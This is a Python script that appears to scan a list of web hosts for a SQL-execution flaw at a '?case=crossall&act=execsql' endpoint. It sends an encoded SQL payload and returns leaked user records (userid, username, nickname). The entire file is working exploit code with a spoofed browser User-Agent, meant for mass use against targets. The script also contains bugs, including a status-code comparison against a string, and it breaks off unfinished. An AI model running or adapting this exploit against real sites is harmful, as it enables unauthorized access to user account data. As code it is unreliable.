import requests

def check(target):
    url = '/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'}
    resp = requests.get(target + url, headers=headers, timeout=30)
    try:
        if resp.status_code == '200' and resp.json()['userid'] and resp.json()['username'] and resp.json()['nickname']:
            return resp.json()
    except TypeError as e:
        print("No vuln: %s" %e)

def main(args):
    files = args.files
    try:
        with open(files, 'r') as f:
            filecontent = f.readlines()
    except FileNotFoundError as e:
        print("File Not Found: %s" %e)
    for f in filecontent:
        result = check(f)

if __name__ == "__main__":
    
